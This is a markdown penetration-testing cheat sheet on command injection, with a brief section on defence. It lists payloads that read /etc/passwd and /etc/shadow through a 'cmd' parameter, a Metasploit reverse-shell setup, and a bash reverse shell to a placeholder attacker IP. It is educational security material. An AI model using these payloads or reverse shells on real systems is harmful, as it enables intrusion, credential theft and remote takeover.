# 🚀 Command Injection

> [!ABSTRACT] Overview of Command Injection Technique
>
> Command injection is a type of attack that allows an attacker to execute arbitrary commands on the server's operating system via a vulnerable application.

---

## 🌟 Common Vectors for Command Injection

### 1. Web Forms and Query Strings

When user input is not properly sanitized, attackers can inject shell commands into form fields or URL parameters.

> [!WARNING] Example of Unsanitized Input
>
> ```text
> http://example.com/vulnerable.php?cmd=id
> ```
>
> This may execute the `id` command on the server if the application does not sanitize the input properly.

---

## 📚 How to Identify Command Injection Vulnerabilities

### 1. Using Nmap and Nikto

Scan for potential vulnerabilities with tools like Nmap or Nikto, looking specifically for web applications that accept unsanitized user inputs.

```bash
nmap --script http-vuln-cve2017-5638.nse <target-ip>
```

---

### 2. Manual Testing with Burp Suite

Utilize an interception proxy like Burp Suite to intercept and modify HTTP requests, injecting commands to test for command injection.

> [!INFO] Steps in Burp Suite
>
> - Intercept a request.
> - Modify the input parameter to include a simple command (e.g., `whoami`).
> - Send the modified request and observe server responses.

---

## 🧪 Testing Command Injection

### 1. Basic Proof of Concept

Injecting commands through web form inputs can be tested by submitting crafted payloads directly into the application's forms or URLs.

> [!EXAMPLE] Basic Command Execution
>
> ```text
> <target-url>?cmd=whoami
> ```
>
> If this command executes successfully, further complex commands can be tested for additional access.

---

### 2. Expanding on Initial Findings

Once initial command execution is confirmed, more sophisticated payloads can be injected to gain deeper insights or execute system-level commands.

```bash
<target-url>?cmd=cat%20/etc/passwd
```

> [!SUCCESS] Succeeded in reading `/etc/passwd`
>
> This indicates that the application is vulnerable to command injection and sensitive information can potentially be accessed.

---

## 📜 Common Payloads

### 1. Reading Files

Injecting commands to read system files can provide valuable insights into server configuration and permissions.

```bash
<target-url>?cmd=cat%20/etc/shadow
```

> [!WARNING] Potential for Information Leakage
>
> This command can reveal sensitive user information stored in `/etc/shadow`.

---

### 2. Exploiting with Metasploit

Utilize the Metasploit framework to automate and expand upon initial findings.

```ruby
use exploit/multi/script/web_delivery
set payload cmd/unix/reverse_perl
set LHOST <attacker-ip>
set RPORT <target-port>
exploit
```

---

## 📐 Defending Against Command Injection

### 1. Input Validation

Implement robust input validation to ensure that all user inputs are sanitized and checked against a whitelist of permitted characters.

> [!NOTE] Importance of Whitelisting
>
> Only allow specific types of input data, such as alphanumeric characters or email addresses for form fields.

---

### 2. WAF Rules and Hardening

Deploy Web Application Firewalls (WAF) that have rules specifically designed to detect command injection patterns.

```text
<target-ip>:443 -> WAF -> <back-end-server>
```

> [!SUCCESS] Successful Mitigation
>
> Proper configuration of WAF can prevent malicious commands from reaching the server.

---

## 🧬 Post-Injection Actions

### 1. Lateral Movement and Persistence

After gaining initial command execution, further actions such as lateral movement to other systems or establishing persistence mechanisms should be considered.

```bash
# Example of a simple reverse shell
bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
```

> [!DANGER] Potential for Destructive Actions
>
> Ensure that any actions taken do not damage or disrupt the integrity of the server beyond initial exploitation.

---

## 🔍 Conclusion

Command injection is a critical security issue that can lead to significant compromises. Proper testing, defense mechanisms, and best practices are essential in mitigating this risk effectively.

> [!ABSTRACT] Summary
>
> Understanding how command injection works, identifying vulnerabilities, and implementing effective defenses are key components of maintaining secure web applications.

---